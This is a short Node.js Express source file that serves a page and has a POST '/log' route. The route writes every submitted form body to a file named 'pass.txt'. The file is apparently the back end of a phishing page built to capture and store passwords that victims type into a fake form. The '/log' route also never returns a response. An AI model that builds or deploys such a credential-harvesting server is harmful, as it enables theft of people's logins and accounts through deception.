import express from "express";
import bodyParser from "body-parser";
import { dirname } from "path";
import { fileURLToPath } from "url";
import fs from "fs";

// Derive __dirname using import.meta.url
const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

app.post("/log", (req, res) => {
    console.log(req.body);
    const data = JSON.stringify(req.body) + "\n";
    fs.appendFile("pass.txt", data, () => {
        console.log("created")
    })
})

app.listen(port, () => {
    console.log(`Server started at http://localhost:${port}`);
});
